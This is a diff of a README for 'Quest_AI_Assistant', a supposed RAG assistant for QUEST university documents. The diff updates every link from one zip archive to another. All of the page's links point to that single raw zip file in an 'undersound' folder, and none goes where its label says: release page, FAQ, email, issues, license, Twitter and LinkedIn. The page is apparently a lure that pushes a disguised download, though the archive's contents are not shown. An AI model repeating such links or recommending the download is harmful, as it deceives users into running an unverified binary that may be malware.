@@ -4,13 +4,13 @@
 Quest_AI_Assistant is an AI-powered application designed to help users find answers directly from official QUEST (Quaid-e-Awam University of Engineering, Science and Technology) documents. This tool uses Retrieval-Augmented Generation (RAG) techniques to provide accurate and relevant information in response to your inquiries.
 
 ## 📥 Download Now
-[![Download Quest_AI_Assistant](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip)
+[![Download Quest_AI_Assistant](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with Quest_AI_Assistant:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip) to find the latest version of the application.
 
 2. **Choose Your Version**
    On the Releases page, you will find different versions of Quest_AI_Assistant. Click on the version you want to download.
@@ -53,23 +53,23 @@ If you encounter any issues while using Quest_AI_Assistant, try the following:
 
 - **Reinstall the Application:** If the software is not running smoothly, uninstall it and then reinstall.
 - **Check Internet Connection:** Ensure you have a stable internet connection for document access.
-- **Consult the FAQ:** Visit the [FAQ section](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip) for common queries.
+- **Consult the FAQ:** Visit the [FAQ section](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip) for common queries.
 
 ## 📞 Support
 Need help? Reach out to our support team via the following means:
 
-- **Email:** https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip
-- **GitHub Issues:** Report any problems on our [GitHub Issues page](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip).
+- **Email:** https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip
+- **GitHub Issues:** Report any problems on our [GitHub Issues page](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip).
 
 ## 📜 License
-Quest_AI_Assistant is licensed under the MIT License. For more details, see the [LICENSE file](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip).
+Quest_AI_Assistant is licensed under the MIT License. For more details, see the [LICENSE file](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip).
 
 ## 🔗 Stay Connected
 Keep up with updates and news about Quest_AI_Assistant:
 
-- [GitHub Repository](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip)
-- [Twitter](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip)
-- [LinkedIn](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip)
+- [GitHub Repository](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip)
+- [Twitter](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip)
+- [LinkedIn](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip)
 
 ## 🔗 Download Again
-For convenience, here’s the link to download Quest_AI_Assistant once more: [Download Quest_AI_Assistant](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_2.7.zip).
+For convenience, here’s the link to download Quest_AI_Assistant once more: [Download Quest_AI_Assistant](https://github.com/ameyagit25/Quest_AI_Assistant/raw/refs/heads/main/undersound/A_Quest_Assistant_3.5.zip).
